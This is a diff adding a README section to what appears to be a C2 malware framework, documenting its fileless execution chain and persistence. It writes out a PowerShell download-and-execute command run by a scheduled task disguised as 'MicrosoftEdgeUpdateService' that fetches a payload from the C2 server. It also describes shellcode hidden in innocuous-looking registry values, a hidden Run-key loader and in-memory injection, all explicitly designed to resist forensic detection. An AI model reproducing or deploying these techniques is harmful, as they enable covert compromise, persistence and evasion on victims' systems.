@@ -154,6 +154,108 @@ For detailed command usage and examples, see the [Usage Guide](docs/USAGE.md).
 
 ---
 
+## 🔥 Fileless Internals
+
+### Execution Chain (In-Memory, Zero Disk Writes)
+
+Every stage executes entirely in memory. No agent binary is ever written to a permanent location on disk.
+
+```
+Disk                       Memory (target process)
+───────────────────────────────────────────────────────────────────────────
+
+ester.exe ──► runs ──────► [ESTER host process]
+                                   │
+                   XOR-decrypt     │  embedded javelin.bin
+                   ◄───────────────┘
+                                   │
+                   VirtualAlloc+   │  JAVELIN shellcode (donut PIC)
+                   CreateThread    ▼
+                           [JAVELIN thread]
+                                   │
+                   XOR-decrypt     │  embedded stage0_payload.bin
+                   ◄───────────────┘
+                                   │
+                   WinHTTP GET     │  /api/stage1/agent_dll
+                   ────────────────►  C2 server (45.x.x.x:5555)
+                                   │
+                   XOR-decrypt     │  agent_dll.dll (XOR-encrypted over HTTP)
+                   + reflective    ◄──────────────────────────────────────
+                   PE load         │
+                                   ▼
+                           [Agent DLL thread]
+                               │
+                        TLS beacon loop ──► C2 server :4444
+```
+
+### Fileless Persistence — Method 1: Scheduled Task Download
+
+The agent sets up a schtask that redownloads and re-executes `ester.exe` on every logon from the C2 API — no permanent binary on disk.
+
+```
+First run (online)
+──────────────────────────────────────────────────────────────
+  ester.exe running in memory
+      │
+      │  after 3-5 min delay + env checks
+      ▼
+  schtasks /Create /SC ONLOGON /TN "MicrosoftEdgeUpdateService"
+           /TR "powershell -EncodedCommand <base64>"
+
+Base64 payload (decoded):
+  $t = [IO.Path]::GetTempPath() + [Guid]::NewGuid().ToString('N') + '.exe'
+  (New-Object Net.WebClient).DownloadFile('http://C2:5555/api/stage0/ester', $t)
+  if (Test-Path $t) { Start-Process $t -WindowStyle Hidden }
+
+Next logon (offline-safe: only fires when C2 reachable)
+──────────────────────────────────────────────────────────────
+  Windows logon
+      │
+      ▼
+  schtask triggers PS
+      │  DownloadFile → %TEMP%\<guid>.exe   (ephemeral, not persistent)
+      ▼
+  ester.exe re-runs in memory → full chain again
+      │
+      ▼
+  old temp file deleted by OS at next temp-cleanup
+```
+
+### Fileless Persistence — Method 2: Dual-Registry Shellcode
+
+The shellcode blob and its XOR key live at two completely unrelated registry paths so that neither value is incriminating on its own.
+
+```
+Registry after setup
+──────────────────────────────────────────────────────────────
+
+  HKCU\Software\Microsoft\InputPersonalization\TrainedDataStore
+      └─ UserData   = "<base64(XOR(shellcode, key))>"    ← looks like ML training data
+
+  HKCU\Software\Microsoft\Windows\CurrentVersion\CloudStore\Cache\AccountsRoot\Settings
+      └─ SyncState  = "<base64(key)>"                    ← looks like cloud-sync state
+
+  HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+      └─ BrokerSync = powershell -NoP -NonI -W Hidden -Ep Bypass -C "..."
+
+Run-key PS loader (conceptual):
+  1. $b = base64_decode( reg read UserData   )   // encrypted blob
+  2. $x = base64_decode( reg read SyncState  )   // key (different hive path)
+  3. for i: $b[i] ^= $x[i % len($x)]            // XOR-decrypt
+  4. $v = VirtualAlloc(RWX, len($b))
+  5. Copy $b → $v
+  6. CreateThread(entry=$v) → shellcode runs in memory
+  7. WaitForSingleObject
+
+Forensic resistance:
+  • Blob alone   → base64 noise, unreadable without key
+  • Key alone    → short bytes, no context
+  • Neither path hints at shellcode storage
+  • Shellcode never touches disk at rest or at execution time
+```
+
+---
+
 ## 🏗️ Architecture
 
 C2R2-v2 follows a modular client-server architecture with encrypted communications:
